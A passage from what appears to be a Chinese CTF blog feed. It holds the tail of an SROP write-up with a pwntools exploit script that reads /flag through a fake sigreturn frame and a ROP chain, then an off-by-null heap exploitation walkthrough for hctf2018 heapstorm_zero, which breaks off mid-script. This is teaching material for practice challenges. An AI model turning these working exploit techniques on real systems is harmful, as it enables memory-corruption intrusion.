libc=ELF(<span class="string">"/lib32/libc.so.6"</span>, checksec = <span class="keyword">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_sh</span><span class="params">(other_libc = null)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> libc</span><br><span class="line">    <span class="keyword">if</span> args[<span class="string">'REMOTE'</span>]:</span><br><span class="line">        <span class="keyword">if</span> other_libc <span class="keyword">is</span> <span class="keyword">not</span> null:</span><br><span class="line">            libc = ELF(<span class="string">"./"</span>, checksec = <span class="keyword">False</span>)</span><br><span class="line">        <span class="keyword">return</span> remote(sys.argv[<span class="number">1</span>], sys.argv[<span class="number">2</span>])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> process(<span class="string">"./vn_pwn_babypwn_1"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_address</span><span class="params">(sh,info=null,start_string=null,end_string=null,offset=null,int_mode=False)</span>:</span></span><br><span class="line">    sh.recvuntil(start_string)</span><br><span class="line">    <span class="keyword">if</span> int_mode :</span><br><span class="line">        return_address=int(sh.recvuntil(end_string).strip(end_string),<span class="number">16</span>)</span><br><span class="line">    <span class="keyword">elif</span> context.arch == <span class="string">'amd64'</span>:</span><br><span class="line">        return_address=u64(sh.recvuntil(end_string).strip(end_string).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        return_address=u32(sh.recvuntil(end_string).strip(end_string).ljust(<span class="number">4</span>,<span class="string">'\x00'</span>))</span><br><span class="line">    log.success(info+str(hex(return_address+offset)))</span><br><span class="line">    <span class="keyword">return</span> return_address+offset</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_flag</span><span class="params">(sh)</span>:</span></span><br><span class="line">    sh.sendline(<span class="string">'cat /flag'</span>)</span><br><span class="line">    <span class="keyword">return</span> sh.recvrepeat(<span class="number">0.3</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_gdb</span><span class="params">(sh,stop=False)</span>:</span></span><br><span class="line">    gdb.attach(sh)</span><br><span class="line">    <span class="keyword">if</span> stop :</span><br><span class="line">        raw_input()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    sh = get_sh()</span><br><span class="line">    get_gdb(sh)</span><br><span class="line">    libc.address = get_address(sh,<span class="string">'The libc base address is '</span>,<span class="string">'Here is my gift: 0x'</span>,<span class="string">'\n'</span>,-libc.symbols[<span class="string">'puts'</span>],<span class="keyword">True</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">'Please input magic message: '</span>)</span><br><span class="line">    fake_frame  = p64(<span class="number">0</span>) * <span class="number">12</span></span><br><span class="line">    fake_frame += p64(<span class="number">0</span>)                                       <span class="comment"># RDI = RAX</span></span><br><span class="line">    fake_frame += p64(<span class="number">0</span>)                                       <span class="comment"># RSI = RDI</span></span><br><span class="line">    fake_frame += p64(<span class="number">0</span>)                                       <span class="comment"># RBP</span></span><br><span class="line">    fake_frame += p64(<span class="number">0</span>)                                       <span class="comment"># RBX</span></span><br><span class="line">    fake_frame += p64(libc.address + <span class="number">0x3C6500</span> - <span class="number">0x10</span>)          <span class="comment"># RDX = RSI</span></span><br><span class="line">    fake_frame += p64(<span class="number">0</span>)                                       <span class="comment"># RAX</span></span><br><span class="line">    fake_frame += p64(<span class="number">0x100</span>)                                   <span class="comment"># RCX = RDX</span></span><br><span class="line">    fake_frame += p64(libc.address + <span class="number">0x3C6500</span>)                 <span class="comment"># RSP</span></span><br><span class="line">    fake_frame += p64(libc.symbols[<span class="string">'syscall'</span>])                 <span class="comment"># RIP</span></span><br><span class="line">    fake_frame += p64(<span class="number">0</span>)                                       <span class="comment"># eflags</span></span><br><span class="line">    fake_frame += p64(<span class="number">0x33</span>)                                    <span class="comment"># cs : gs : fs</span></span><br><span class="line">    fake_frame += p64(<span class="number">0</span>) * <span class="number">7</span></span><br><span class="line">    <span class="comment"># get_gdb(sh)</span></span><br><span class="line">    sh.send(fake_frame)</span><br><span class="line">    ROP_chain  = <span class="string">'/flag\x00\x00\x00'</span></span><br><span class="line">    ROP_chain += p64(<span class="number">0</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x0000000000021102</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x3C6500</span> - <span class="number">0x10</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x00000000000202e8</span>)</span><br><span class="line">    ROP_chain += p64(<span class="number">0</span>)</span><br><span class="line">    ROP_chain += p64(libc.symbols[<span class="string">'open'</span>])</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x0000000000021102</span>)</span><br><span class="line">    ROP_chain += p64(<span class="number">3</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x00000000000202e8</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x3C6700</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x0000000000001b92</span>)</span><br><span class="line">    ROP_chain += p64(<span class="number">0x100</span>)</span><br><span class="line">    ROP_chain += p64(libc.symbols[<span class="string">'read'</span>])</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x0000000000021102</span>)</span><br><span class="line">    ROP_chain += p64(<span class="number">1</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x00000000000202e8</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x3C6700</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x0000000000001b92</span>)</span><br><span class="line">    ROP_chain += p64(<span class="number">0x100</span>)</span><br><span class="line">    ROP_chain += p64(libc.symbols[<span class="string">'write'</span>])</span><br><span class="line">    <span class="comment">#raw_input('&gt;')</span></span><br><span class="line">    sh.send(ROP_chain)</span><br><span class="line">    <span class="keyword">print</span> sh.recv()</span><br></pre></td></tr></table></figure><p>参考文章  :</p><p><a href="https://ray-cp.github.io/archivers/srop-analysis" target="_blank" rel="noopener">https://ray-cp.github.io/archivers/srop-analysis</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;什么是SROP&quot;&gt;&lt;a href=&quot;#什么是SROP&quot; class=&quot;headerlink&quot; title=&quot;什么是SROP&quot;&gt;&lt;/a&gt;什么是SROP&lt;/h2&gt;&lt;p&gt;&lt;code&gt;SROP&lt;/code&gt; 全称&lt;code&gt;Sigreturn Oriented Progr
      
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>off-by-null</title>
    <link href="https://nocbtm.github.io/2020/02/28/off-by-null/"/>
    <id>https://nocbtm.github.io/2020/02/28/off-by-null/</id>
    <published>2020-02-28T08:47:12.000Z</published>
    <updated>2020-04-07T03:40:06.561Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>off by null 是一个比较有意思的技术 下面通过 hctf2018 的 heapstrom_zero 实战一波。</p><p>题目链接 <a href="https://github.com/veritas501/hctf2018" target="_blank" rel="noopener">https://github.com/veritas501/hctf2018</a></p><h2 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h2><p>直接拿源码分析，程序是一个比较简单的菜单程序</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">int main(void)&#123;</span><br><span class="line">init();</span><br><span class="line">while(1)&#123;</span><br><span class="line">switch(menu_getinput())&#123;</span><br><span class="line">case 1:&#123;</span><br><span class="line">Allocate();</span><br><span class="line">break;</span><br><span class="line">&#125;</span><br><span class="line">case 2:&#123;</span><br><span class="line">View();</span><br><span class="line">break;</span><br><span class="line">&#125;</span><br><span class="line">case 3:&#123;</span><br><span class="line">Delete();</span><br><span class="line">break;</span><br><span class="line">&#125;</span><br><span class="line">case 4:&#123;</span><br><span class="line">puts(&quot;Bye!&quot;);</span><br><span class="line">exit(0);</span><br><span class="line">&#125;</span><br><span class="line">default:&#123;</span><br><span class="line">puts(&quot;Invaild choice!&quot;);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先初始化一些东西，比如随机 mmap 一块内存用来存放指针之类的。然后提供三个选项供用户选择。</p><h3 id="init"><a href="#init" class="headerlink" title="init"></a>init</h3><p>看看 init 函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">()</span></span>&#123;</span><br><span class="line">sum=<span class="number">0</span>;</span><br><span class="line">setvbuf(<span class="built_in">stdin</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line">setvbuf(<span class="built_in">stdout</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line">setvbuf(<span class="built_in">stderr</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line"><span class="keyword">int</span> fd = open(<span class="string">"/dev/urandom"</span>,<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(fd&lt;<span class="number">0</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Open urandom error!!\n"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">void</span> * pageaddr;</span><br><span class="line"><span class="keyword">if</span>(read(fd,&amp;pageaddr,<span class="keyword">sizeof</span>(<span class="keyword">void</span> *)) == <span class="number">-1</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Read urandom error!!\n"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line">pageaddr = (<span class="keyword">void</span> *)(((<span class="keyword">size_t</span>)(pageaddr)&amp;~<span class="number">0xfff</span>)%<span class="number">0x133700000000</span>);</span><br><span class="line"><span class="comment">// 随机mmap 一块内存，存放程序分配的内存指针</span></span><br><span class="line">page = mmap(pageaddr,<span class="number">0x1000</span>,<span class="number">3</span>,<span class="number">34</span>,<span class="number">-1</span>,<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(page != pageaddr)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"mmap error!!\n"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 随机生成秘钥，用于加密指针</span></span><br><span class="line"><span class="keyword">if</span>(read(fd,&amp;(page-&gt;xorkey),<span class="keyword">sizeof</span>(<span class="keyword">size_t</span>)) == <span class="number">-1</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Read urandom error!!\n"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">0x20</span>;i++)&#123;</span><br><span class="line">page-&gt;chunk[i]=(<span class="keyword">char</span> *)page-&gt;xorkey;</span><br><span class="line">&#125;</span><br><span class="line">bar();</span><br><span class="line">close(fd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>分配一块内存，然后生成一个随机秘钥，秘钥的作用是把程序分配的内存的指针异或加密一下。</p><h3 id="Allocate"><a href="#Allocate" class="headerlink" title="Allocate"></a>Allocate</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Allocate</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"><span class="keyword">if</span>(sum &gt; <span class="number">0x20</span>u)&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"Too many chunks!"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Please input chunk size:"</span>);</span><br><span class="line"><span class="keyword">int</span> size = read_int();   </span><br><span class="line"><span class="comment">// size 最大为0x38</span></span><br><span class="line"><span class="keyword">if</span>(!check_chunksize(size))&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"Invalid size!"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> * p = (<span class="keyword">char</span> *)<span class="built_in">calloc</span>(size, <span class="number">1</span>);</span><br><span class="line"><span class="keyword">if</span>(!p)&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"Alloc error!!"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Please input chunk content:"</span>);</span><br><span class="line"><span class="comment">// read_n 会向p[size]='\x00',所以有一字节的溢出，溢出的字节为'\x00'</span></span><br><span class="line">read_n(p, size);</span><br><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">31</span> &amp;&amp; (<span class="keyword">size_t</span>)page-&gt;chunk[i]^page-&gt;xorkey; ++i )&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ( i == <span class="number">32</span> )&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"Too many chunks!"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 指针xor加密存放</span></span><br><span class="line">page-&gt;chunk[i] = (<span class="keyword">char</span>*)((<span class="keyword">size_t</span>)p^page-&gt;xorkey);</span><br><span class="line">++sum;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Chunk index: %d\n"</span>,i);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先让用户输入一个 size , 然后判断 size 最大只能为 0x38 ， 这意味着我们只能分配 fastbin 的 chunk. 分配好内存后，会读入数据到里面，这时候会有一个 \x00 字节的溢出。</p><h3 id="View"><a href="#View" class="headerlink" title="View"></a>View</h3><p>就是把指针解密出来，然后用 printf 打印内容。</p><h3 id="Delete"><a href="#Delete" class="headerlink" title="Delete"></a>Delete</h3><p>解密出指针，然后释放掉，同时把相关的项设置为初始状态。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Delete</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Please input chunk index: "</span>);</span><br><span class="line"><span class="keyword">int</span> idx = read_int();</span><br><span class="line"><span class="keyword">if</span> ( idx &lt; <span class="number">0</span> || idx &gt; <span class="number">31</span> )&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"Invalid index!"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">char</span> *p = (<span class="keyword">char</span>*)((<span class="keyword">size_t</span>)page-&gt;chunk[idx]^page-&gt;xorkey);</span><br><span class="line"><span class="keyword">if</span> ( p )</span><br><span class="line">&#123;</span><br><span class="line">--sum;</span><br><span class="line"><span class="built_in">free</span>(p);</span><br><span class="line">page-&gt;chunk[idx] = (<span class="keyword">char</span>*)(page-&gt;xorkey);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>总结一下程序的功能。</p><p>我们最多只能 malloc(0x38) 即 0x40 大小的 chunk.<br>有一个 打印 chunk 内容的函数。<br>分配时可以 off by null.</p><h2 id="利用分析"><a href="#利用分析" class="headerlink" title="利用分析"></a>利用分析</h2><h3 id="简述"><a href="#简述" class="headerlink" title="简述"></a>简述</h3><p>一字节溢出的利用围绕着的是 堆块在分配，释放，合并时对 chunk 的 size 域的信任关系。而如果只是 fastbin 的话 off by null 是没法利用的，因为只要溢出就会把 size 设置为 0.</p><p>这里有一个 tips , 使用 scanf 获取内容时，如果 输入字符串比较长会调用 malloc 来分配内存。</p><p>在 malloc 分配内存时，首先会一次扫描一遍 fastbin , smallbin ， unsorted bin ，largebin, 如果都找不到可以分配的 chunk 分配给用户 ， 会进入 top_chunk 分配的流程， 如果此时还有 fastbin ，就会触发堆合并机制，把 fastbin 合并 之后放入 smallbin，再看能否分配，不能的话会使用 top_chunk 进行分配。</p><p>于是利用 scanf 能分配大内存的特性，我们可以触发 堆合并，然后让 fastbin 合并成一个 smallbin , 然后在触发 off-by-null , 就是常规的利用思路了。</p><h3 id="信息泄露"><a href="#信息泄露" class="headerlink" title="信息泄露"></a>信息泄露</h3><p>首先分配 12 个 chunk, 其中 第一个 和最后一个保留， 第一个 chunk 用于 触发 off-by-null ， 最后一个用于防止在 堆合并时与 top_chunk 进行合并。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x38</span>, <span class="string">'a'</span>)  <span class="comment"># 0</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x28</span>, <span class="string">'a'</span>)  <span class="comment"># 1</span></span><br><span class="line">add(<span class="number">0x28</span>, <span class="string">'a'</span>)  <span class="comment"># 2</span></span><br><span class="line">add(<span class="number">0x18</span>, <span class="string">'a'</span>)  <span class="comment"># 3</span></span><br><span class="line">add(<span class="number">0x18</span>, <span class="string">'a'</span>)  <span class="comment"># 4</span></span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">'x'</span>)  <span class="comment"># 5</span></span><br><span class="line">add(<span class="number">0x28</span>, <span class="string">'x'</span>)  <span class="comment"># 6</span></span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">'x'</span>)  <span class="comment"># 7</span></span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">'x'</span>)  <span class="comment"># 8</span></span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">'x'</span>)  <span class="comment"># 9</span></span><br><span class="line">pay = <span class="string">'a'</span> * <span class="number">0x20</span> + p64(<span class="number">0x200</span>) + p64(<span class="number">0x20</span>)  <span class="comment"># shrink chunk 前，配置好</span></span><br><span class="line">add(<span class="number">0x38</span>, pay)  <span class="comment"># 10</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">'end'</span>)  <span class="comment"># 11  , 保留块， 防止和 top chunk 合并</span></span><br></pre></td></tr></table></figure><p>然后把中间的 10 个 chunk 释放掉，同时触发 堆合并，构造一个 0x210 大小的 smallbin<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># 释放掉 chunk</span><br><span class="line">for i in range(1, 11):</span><br><span class="line">    dele(i)</span><br><span class="line"></span><br><span class="line"># 利用 scanf 分配大内存 0x400+ , 会触发堆合并</span><br><span class="line"># fastbin 会合并进入 smallbin</span><br><span class="line">triger_consolidate()</span><br></pre></td></tr></table></figure></p><p>函数 triger_consolidate 的逻辑就是发送 0x400 的字符串给 scanf 处理，然后 scanf 会分配大内存，触发 堆合并。</p><p>此时的内存布局如下</p><p><img alt="" data-src="/imgs/off-by-null-1.png" class="lozad"></p><p>图中特殊标出的 0x200 | 0x20 用于保证后续利用过掉 check.</p><p>然后利用 chunk 0 , 溢出 一字节的 \x00 , 修改下面那个 smallbin 的 size —&gt; 0x200</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 利用 chunk 0 , 溢出 一字节的 \x00 , 修改 size ---&gt; 0x200</span></span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">pay = <span class="string">'a'</span> * <span class="number">0x38</span></span><br><span class="line">add(<span class="number">0x38</span>, pay)  <span class="comment"># 0</span></span><br></pre></td></tr></table></figure><p>紧接着在这个剩下的 0x200 字节的 smallbin 里面分配 8 个 chunk , 然后利用同样的方法，在里面构造一个 smallbin</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x38</span>, <span class="string">'a'</span> * <span class="number">8</span>)  <span class="comment"># 1</span></span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">'b'</span> * <span class="number">8</span>)  <span class="comment"># 2</span></span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">'c'</span> * <span class="number">8</span>)  <span class="comment"># 3</span></span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">'x'</span>)  <span class="comment"># 4</span></span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">'x'</span>)  <span class="comment"># 5</span></span><br><span class="line">add(<span class="number">0x28</span>, <span class="string">'x'</span>)  <span class="comment"># 6</span></span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">'x'</span>)  <span class="comment"># 7</span></span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">'x'</span>)  <span class="comment"># 8</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 利用 大量的 fastbin + 堆合并 构造 smallbin , 大小 0xc0</span></span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">dele(<span class="number">2</span>)</span><br><span class="line">dele(<span class="number">3</span>)</span><br><span class="line">triger_consolidate()</span><br></pre></td></tr></table></figure><p><img alt="" data-src="/imgs/off-by-null-2.png" class="lozad"></p><p>下面释放掉 chunk 11</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 触发 overlap</span></span><br><span class="line">dele(<span class="number">11</span>)</span><br><span class="line">triger_consolidate()</span><br></pre></td></tr></table></figure><p>系统发现 chunk 11 的 pre_size 为 0 ，即表明前一个 chunk 是释放状态，同时 chunk 11 和 top_chunk 相邻，所以 即使 chunk 11 的大小在 fastbin 的范围内也会触发合并操作，于是会通过 chunk 11 的 pre_size ( 0x210 ) 找到上面那个 smallbin 的起始地址。</p><p>然后对 smallbin 做 unlink 操作， 此时 smallbin 已经在链表上，所以 unlink 可以通过，拆下来后进行合并， 合并之后形成了一个大 chunk.<br><img alt="" data-src="/imgs/off-by-null-3.png" class="lozad"></p><p>这个 chunk 会继续和 top_chunk 合并变成 top_chunk 的一部分。注意到此时 chunk4 - chunk8 已经落入 top_chunk 里。</p><p>接下来通过类似的方法，分配多个 chunk ， 然后释放掉中间的一些的 chunk , 然后出发 堆合并，构造一个比较大的 smallbin<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">add(0x28, &apos;a&apos;)  # 1</span><br><span class="line">add(0x28, &apos;a&apos;)  # 2</span><br><span class="line">add(0x18, &apos;a&apos;)  # 3</span><br><span class="line">add(0x18, &apos;a&apos;)  # 9</span><br><span class="line">add(0x38, &apos;1&apos; * 0x30)  # 10</span><br><span class="line">add(0x38, &apos;2&apos; * 0x30)  # 11</span><br><span class="line">add(0x28, &apos;3&apos; * 0x30)  # 12</span><br><span class="line">add(0x38, &apos;4&apos; * 0x30)  # 13</span><br><span class="line">add(0x38, &apos;5&apos; * 0x30)  # 14</span><br><span class="line">pay = &apos;a&apos; * 0x20 + p64(0x200) + p64(0x20)</span><br><span class="line">add(0x38, pay)  # 15</span><br><span class="line"></span><br><span class="line">add(0x38, &apos;end&apos;)  # 16</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">dele(1)</span><br><span class="line">dele(2)</span><br><span class="line">dele(3)</span><br><span class="line">for i in range(9, 16):</span><br><span class="line">    dele(i)</span><br><span class="line"></span><br><span class="line">triger_consolidate()</span><br></pre></td></tr></table></figure></p><p>此时的内存状态如图</p><p><img alt="" data-src="/imgs/off-by-null-4.png" class="lozad"></p><p>此时 chunk 4 - chunk 8 落入了新构造的 smallbin 里面。下面通过 不断的分配，会对这个 smallbin 进行切割，这个过程就会使得 一些链表用的指针落入到 还处于 使用状态的 chunk4 - chunk8 的某一个 chunk 里面， 然后利用 puts 功能，就可以打印指针的内容，造成信息泄露， 拿到 libc 的地址。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">### 构造好 unsorted bin ，下面通过不断切割，让指针落入 overlap chunk 里面， 然后 Puts leak 出来</span></span><br><span class="line"></span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">pay = <span class="string">'a'</span> * <span class="number">0x38</span></span><br><span class="line">add(<span class="number">0x38</span>, pay)  <span class="comment"># 0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">###  再次 shrink chunk 利用切割smallbin遗留下的指针，leak libc</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">'a'</span> * <span class="number">8</span>)  <span class="comment"># 1</span></span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">'b'</span> * <span class="number">8</span>)  <span class="comment"># 2</span></span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">'c'</span> * <span class="number">8</span>)  <span class="comment"># 3</span></span><br><span class="line"></span><br><span class="line">view(<span class="number">4</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Content: '</span>)</span><br><span class="line">lbase = 